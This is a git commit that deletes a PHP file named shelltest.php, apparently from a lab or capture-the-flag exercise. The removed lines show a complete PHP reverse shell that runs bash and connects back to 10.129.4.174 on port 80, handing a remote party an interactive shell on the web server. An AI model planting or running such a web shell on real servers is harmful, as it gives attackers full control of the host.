154a05c8323f9ab466824e36c99752c9a24f4ed1
echosso <92608044+echoosso@users.noreply.github.com>
2025-12-06 04:31:42 +0100

    Delete shelltest.php

--- shelltest.php
+++
@@ -1,9 +0,0 @@
-<?php
-$desc = array(
-  0=>array("pipe","r"),
-  1=>array("pipe","w"),
-  2=>array("pipe","w")
-);
-$cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.129.4.174/80 0>&1'";
-$process = proc_open($cmd, $desc, $pipes);
-?>
